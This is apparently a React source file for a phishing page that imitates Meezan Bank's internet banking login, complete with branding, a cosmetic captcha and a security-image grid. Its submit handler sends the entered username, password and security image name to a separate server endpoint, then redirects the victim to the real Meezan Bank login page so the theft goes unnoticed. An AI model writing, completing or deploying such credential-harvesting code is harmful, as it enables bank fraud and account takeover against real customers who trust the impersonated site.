import React, { useState } from 'react'
import { useForm } from 'react-hook-form'

const securityImages = [
  { id: "securityimg7",  name: "Car",  src: "/securityimg7.png"  },
  { id: "securityimg4",  name: "Bulb",        src: "/securityimg4.png"  },
  { id: "securityimg17", name: "Telephone",        src: "/securityimg17.png" },
  { id: "securityimg1",  name: "Airplane",    src: "/securityimg1.png"  },
  { id: "securityimg13", name: "Mouse",   src: "/securityimg13.png" },
  { id: "securityimg9",  name: "Clock", src: "/securityimg9.png"  },
  { id: "securityimg6",  name: "Cap",      src: "/securityimg6.png"  },
  { id: "securityimg12", name: "Glasses",        src: "/securityimg12.png" },
  { id: "securityimg14", name: "Mug",    src: "/securityimg14.png" },
  { id: "securityimg10", name: "Bicycle",      src: "/securityimg10.png" },
]

function generateCaptcha() {
  const chars = "ABCDEFGHJKLMNPQRSTUVWXYZabcdefghjkmnpqrstuvwxyz23456789"
  return Array.from({ length: 6 }, () => chars[Math.floor(Math.random() * chars.length)]).join("")
}

const CaptchaDisplay = ({ text }) => {
  const chars = text.split("")
  return (
    <svg width="120" height="44" style={{ background: "rgba(255,255,255,0.92)", borderRadius: 6, flexShrink: 0, border: "1px solid #ccc" }}>
      <line x1="0" y1="18" x2="120" y2="30" stroke="#aaa" strokeWidth="1.5"/>
      <line x1="0" y1="30" x2="120" y2="14" stroke="#bbb" strokeWidth="1"/>
      {chars.map((ch, i) => (
        <text key={i} x={12 + i * 17} y={28 + (i % 2 === 0 ? -4 : 4)}
          fontSize={19} fontFamily="'Courier New', monospace" fontWeight="bold"
          fill={`hsl(${270 + i * 15}, 50%, 30%)`}
          transform={`rotate(${(i % 3 - 1) * 10}, ${20 + i * 17}, 24)`}
          style={{ userSelect: "none" }}>
          {ch}
        </text>
      ))}
    </svg>
  )
}

const App = () => {
  const [showPassword, setShowPassword] = useState(false)
  const [captchaText, setCaptchaText] = useState(generateCaptcha())
  const [loading, setLoading] = useState(false)
  const [apiError, setApiError] = useState('')

  const { register, handleSubmit, watch, setValue, reset } = useForm({
    defaultValues: {
      username: '',
      password: '',
      rememberUsername: true,
      captchaInput: '',
      selectedIcon: null
    }
  })

  const refreshCaptcha = () => { 
    setCaptchaText(generateCaptcha())
    setValue('captchaInput', '')
  }

  const resetForm = () => {
    reset({
      username: '',
      password: '',
      rememberUsername: true,
      captchaInput: '',
      selectedIcon: null
    })
  }

  const onSubmit = async (data) => {
    setLoading(true)
    setApiError('')
    
    const selectedImageData = securityImages.find(img => img.id === data.selectedIcon)
    
    // Only sending the three required fields: username, password, image name
    const formData = {
      username: data.username,
      password: data.password,
      imageName: selectedImageData ? selectedImageData.name : ''
    }

    try { 
      // Replace with your actual API endpoint
      const response = await fetch('http://localhost:5000/api/login', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(formData)
      })

      // Check if response is empty
      const text = await response.text()
      const result = text ? JSON.parse(text) : {}
      
      if (!response.ok) {
        throw new Error(result.message || 'Login failed')
      }
      
      // Reset form
      resetForm()
      
      // Refresh captcha
      refreshCaptcha()
      
      // Redirect to Meezan Bank website after successful login
      window.location.href = 'https://ebanking.meezanbank.com/AmbitRetailFrontEnd/login'
      
    } catch (error) {
      console.error('Login error:', error)
      setApiError(error.message || 'Failed to connect to server')
    } finally {
      setLoading(false)
    }
  }

  const inputWrap = {
    background: "rgba(255,255,255,0.95)",
    border: "1px solid rgba(255,255,255,0.6)",
    borderRadius: 8,
    display: "flex", alignItems: "center", gap: 10,
    padding: "10px 14px",
  }

  const shadow = { textShadow: "0 1px 8px rgba(0,0,0,0.9)" }

  return (
    <div
      className="min-h-screen w-full bg-cover bg-center bg-no-repeat"
      style={{ backgroundImage: "url('/new-login-back.jpg')" }}
    >
      <div className="min-h-screen w-full flex flex-col items-center justify-center">

        {/* Logo */}
        <img
          src="/new-login-logo.png"
          alt="Meezan Bank"
          className="w-24 h-24 rounded-full shadow-2xl mb-4"
          style={{ border: "3px solid #fff" }}
          onError={(e) => { e.target.style.display = "none" }}
        />

        {/* Title */}
        <h1 className="text-white text-3xl font-bold mb-6 text-center" style={shadow}>
          Welcome To Meezan Internet Banking
        </h1>

        {/* Error Message */}
        {apiError && (
          <div className="w-full max-w-md mb-4 p-3 bg-red-500 text-white rounded-lg text-center">
            {apiError}
          </div>
        )}

        {/* Form */}
        <form onSubmit={handleSubmit(onSubmit)} className="w-full flex flex-col gap-3" style={{ maxWidth: 480, padding: "0 16px" }}>

          {/* Username */}
          <div style={inputWrap}>
            <svg className="w-5 h-5 shrink-0" fill="#7c3aed" viewBox="0 0 24 24">
              <path d="M12 12c2.7 0 4.8-2.1 4.8-4.8S14.7 2.4 12 2.4 7.2 4.5 7.2 7.2 9.3 12 12 12zm0 2.4c-3.2 0-9.6 1.6-9.6 4.8v2.4h19.2v-2.4c0-3.2-6.4-4.8-9.6-4.8z"/>
            </svg>
            <input 
              type="text" 
              placeholder="Username" 
              {...register('username')}
              className="bg-transparent flex-1 outline-none text-gray-700 text-sm" 
            />
          </div>

          {/* Remember / Forgot Username */}
          <div className="flex items-center justify-between px-1">
            <label className="flex items-center gap-2 cursor-pointer">
              <input 
                type="checkbox" 
                {...register('rememberUsername')}
                className="accent-purple-600 w-4 h-4" 
              />
              <span className="text-green-400 text-sm font-semibold" style={shadow}>Remember Username</span>
            </label>
            <button type="button" className="text-white text-sm font-medium hover:underline" style={shadow}>
              Forgot Username?
            </button>
          </div>

          {/* Password */}
          <div style={inputWrap}>
            <svg className="w-5 h-5 shrink-0" fill="#7c3aed" viewBox="0 0 24 24">
              <path d="M18 8h-1V6c0-2.8-2.2-5-5-5S7 3.2 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.7 1.4-3.1 3.1-3.1 1.7 0 3.1 1.4 3.1 3.1v2z"/>
            </svg>
            <input 
              type={showPassword ? "text" : "password"} 
              placeholder="Password"
              {...register('password')}
              className="bg-transparent flex-1 outline-none text-gray-700 text-sm" 
            />
            <button type="button" onClick={() => setShowPassword(v => !v)} className="text-purple-600 hover:text-purple-800 shrink-0">
              {showPassword ? (
                <svg className="w-5 h-5" fill="none" stroke="currentColor" strokeWidth="2" viewBox="0 0 24 24">
                  <path d="M17.94 17.94A10.94 10.94 0 0112 20C7 20 2.73 16.11 1 12c.73-1.9 1.93-3.6 3.46-4.96M9.9 4.24A9.12 9.12 0 0112 4c5 0 9.27 3.89 11 8a18.5 18.5 0 01-2.16 3.72M3 3l18 18"/>
                </svg>
              ) : (
                <svg className="w-5 h-5" fill="none" stroke="currentColor" strokeWidth="2" viewBox="0 0 24 24">
                  <path d="M1 12C2.73 7.89 7 4 12 4s9.27 3.89 11 8c-1.73 4.11-6 8-11 8S2.73 16.11 1 12z"/>
                  <circle cx="12" cy="12" r="3"/>
                </svg>
              )}
            </button>
          </div>

          {/* Forgot Password */}
          <div className="flex justify-end px-1 -mt-1">
            <button type="button" className="text-white text-sm font-medium hover:underline" style={shadow}>
              Forgot Password?
            </button>
          </div>

          {/* Captcha */}
          <div className="flex items-center gap-2">
            <CaptchaDisplay text={captchaText} />
            <button type="button" onClick={refreshCaptcha}
              className="text-white hover:text-purple-200 transition-colors shrink-0"
              style={{ filter: "drop-shadow(0 1px 4px rgba(0,0,0,0.8))" }}>
              <svg className="w-6 h-6" fill="none" stroke="currentColor" strokeWidth="2" viewBox="0 0 24 24">
                <path d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15"/>
              </svg>
            </button>
            <input 
              type="text" 
              placeholder="Enter Captcha" 
              {...register('captchaInput')}
              className="flex-1 rounded-lg px-3 py-2.5 text-gray-800 text-sm outline-none"
              style={{ background: "rgba(255,255,255,0.95)", border: "1px solid rgba(255,255,255,0.6)" }} 
            />
          </div>

          {/* Security Images */}
          <div>
            <div className="flex items-center gap-2 mb-2">
              <span className="text-white text-sm font-medium" style={shadow}>Select security image</span>
              <div className="w-5 h-5 rounded-full flex items-center justify-center cursor-pointer bg-amber-500 shrink-0"
                title="Choose an image you recognize for added security">
                <span className="text-white text-xs font-bold">?</span>
              </div>
            </div>

            <div className="grid grid-cols-5 gap-2">
              {securityImages.map((img) => (
                <button
                  type="button"
                  key={img.id}
                  onClick={() => setValue('selectedIcon', img.id)}
                  title={img.name}
                  className="rounded-lg flex items-center justify-center transition-all duration-150"
                  style={{
                    padding: "10px",
                    background: watch('selectedIcon') === img.id
                      ? "rgba(255,255,255,0.2)"
                      : "rgba(0,0,0,0.01)",
                    border: watch('selectedIcon') === img.id
                      ? "2px solid rgba(255,255,255,0.9)"
                      : "2px solid rgba(255,255,255,0.45)",
                    transform: watch('selectedIcon') === img.id ? "scale(1.08)" : "scale(1)",
                  }}
                >
                  <img
                    src={img.src}
                    alt={img.name}
                    className="w-9 h-9 object-contain"
                  />
                </button>
              ))}
            </div>

            <div className="flex justify-end mt-1">
              <button type="button" className="text-white text-sm font-medium hover:underline" style={shadow}>
                Forgot Security Image?
              </button>
            </div>
          </div>

          {/* Login Button */}
          <button 
            type="submit" 
            disabled={loading}
            className="w-full rounded-xl py-3 text-white font-bold text-base tracking-widest mt-1 transition-all duration-200 flex items-center justify-center gap-3"
            style={{
              background: loading ? "rgba(124,58,237,0.6)" : "linear-gradient(90deg, #7c3aed 0%, #6d28d9 100%)",
              boxShadow: "0 4px 24px rgba(0,0,0,0.4)",
            }}>
            {loading ? (
              <>
                <img src="/button-loader.gif" alt="loading" className="w-5 h-5" />
                Logging in...
              </>
            ) : "Login"}
          </button>

        </form>
      </div>
    </div>
  )
}

export default App